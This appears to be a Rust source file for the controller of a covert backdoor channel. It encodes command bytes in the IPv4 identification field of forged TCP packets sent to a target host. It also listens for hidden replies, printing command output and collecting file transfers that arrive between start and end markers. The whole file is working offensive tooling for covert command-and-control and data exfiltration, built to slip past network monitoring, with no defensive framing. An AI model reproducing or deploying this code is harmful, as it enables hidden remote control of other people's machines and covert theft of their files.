use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::packet::ethernet::{EthernetPacket, EtherTypes};
use pnet::packet::ipv4::{MutableIpv4Packet, Ipv4Packet, checksum};
use pnet::packet::tcp::{MutableTcpPacket, TcpFlags, TcpPacket, ipv4_checksum};
use pnet::packet::Packet;
use std::net::Ipv4Addr;
use pnet::datalink::{DataLinkSender, DataLinkReceiver, NetworkInterface, channel, Channel};
use std::sync::atomic::{AtomicU16, Ordering};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::Duration;

// Accessing codes from main.rs logic
const CMD_EOF: u8 = 0x41;

static IPID_COUNTER: AtomicU16 = AtomicU16::new(0);

pub struct ChannelConfig {
    pub target_ip: Ipv4Addr,
    pub local_ip: Ipv4Addr,
    pub send_port: u16,    // tx_port from KnockSession
    pub listen_port: u16,  // rx_port from KnockSession
}

pub struct CovertChannel {
    pub config: Arc<ChannelConfig>,
    pub tx: Box<dyn DataLinkSender>,
}

impl CovertChannel {
    pub fn new(
        interface: &NetworkInterface,
        target_ip: Ipv4Addr,
        local_ip: Ipv4Addr,
        send_port: u16,
        listen_port: u16,
    ) -> (Self, Box<dyn DataLinkReceiver>) {
        let (tx, rx) = match channel(interface, Default::default()) {
            Ok(Channel::Ethernet(tx, rx)) => (tx, rx),
            _ => panic!("Failed to open raw channel. Run with sudo."),
        };

        let config = Arc::new(ChannelConfig {
            target_ip,
            local_ip,
            send_port,
            listen_port,
        });

        (Self { config, tx }, rx)
    }

    /// Sends a single byte encoded in the IPID field
    pub fn send_byte(&mut self, byte: u8) {
        let mut buffer = [0u8; 40];
        let (ip_slice, tcp_slice) = buffer.split_at_mut(20);

        let mut ip_packet = MutableIpv4Packet::new(ip_slice).unwrap();
        ip_packet.set_version(4);
        ip_packet.set_header_length(5);
        ip_packet.set_total_length(40);
        ip_packet.set_ttl(64);
        ip_packet.set_next_level_protocol(IpNextHeaderProtocols::Tcp);
        ip_packet.set_source(self.config.local_ip);
        ip_packet.set_destination(self.config.target_ip);
        ip_packet.set_flags(2); // Don't Fragment
        ip_packet.set_fragment_offset(0);

        // Encoding: Mix a rolling counter with the covert byte
        let current_count = IPID_COUNTER.fetch_add(1, Ordering::Relaxed);
        let upper = (current_count & 0x00FF) << 8;
        let covert_id = upper | (byte as u16);
        ip_packet.set_identification(covert_id);

        let mut tcp_packet = MutableTcpPacket::new(tcp_slice).unwrap();
        tcp_packet.set_source(self.config.listen_port); 
        tcp_packet.set_destination(self.config.send_port);
        tcp_packet.set_window(64240);
        tcp_packet.set_data_offset(5);
        tcp_packet.set_flags(TcpFlags::ACK);
        tcp_packet.set_sequence(0x11111111);
        tcp_packet.set_acknowledgement(0x22222222);

        let tcp_checksum = ipv4_checksum(&tcp_packet.to_immutable(), &self.config.local_ip, &self.config.target_ip);
        tcp_packet.set_checksum(tcp_checksum);
        
        let ip_checksum = checksum(&ip_packet.to_immutable());
        ip_packet.set_checksum(ip_checksum);

        let _ = self.tx.send_to(ip_packet.packet(), None);
    }

    /// Utility to send full strings (commands)
    pub fn send_command(&mut self, cmd: &str) {
        for b in cmd.as_bytes() {
            self.send_byte(*b);
            thread::sleep(Duration::from_millis(10));
        }
        self.send_byte(b'\n');
    }
}

/// The stateful receiver that buffers incoming bytes
pub fn start_listening(mut rx: Box<dyn DataLinkReceiver>, config: Arc<ChannelConfig>) {
    thread::spawn(move || {
        let mut string_buffer = String::new();
        let mut binary_mode = false;
        let mut file_data = Vec::new();

        println!("[*] Covert Listener Active on port {}", config.listen_port);

        loop {
            match rx.next() {
                Ok(packet) => {
                    if let Some(eth) = EthernetPacket::new(packet) {
                        if eth.get_ethertype() == EtherTypes::Ipv4 {
                            if let Some(ip) = Ipv4Packet::new(eth.payload()) {
                                if ip.get_next_level_protocol() == IpNextHeaderProtocols::Tcp && 
                                   ip.get_source() == config.target_ip {
                                    
                                    if let Some(tcp) = TcpPacket::new(ip.payload()) {
                                        if tcp.get_destination() == config.listen_port {
                                            // DECODE
                                            let byte = (ip.get_identification() & 0x00FF) as u8;
                                            
                                            // PROTOCOL LOGIC
                                            match byte {
                                                0x40 => { // CMD_START_TRANSFER
                                                    binary_mode = true;
                                                    file_data.clear();
                                                    println!("\n[!] Incoming file transfer started...");
                                                },
                                                CMD_EOF => { // 0x41
                                                    if binary_mode {
                                                        println!("\n[+] File transfer complete. Received {} bytes.", file_data.len());
                                                        binary_mode = false;
                                                        // Here you would save file_data to disk
                                                    }
                                                },
                                                _ => {
                                                    if binary_mode {
                                                        file_data.push(byte);
                                                    } else {
                                                        // String Buffering for terminal output
                                                        let c = byte as char;
                                                        print!("{}", c);
                                                        std::io::Write::flush(&mut std::io::stdout()).unwrap();
                                                        
                                                        if c == '\n' {
                                                            string_buffer.clear();
                                                        } else {
                                                            string_buffer.push(c);
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
                Err(_) => continue,
            }
        }
    });
}
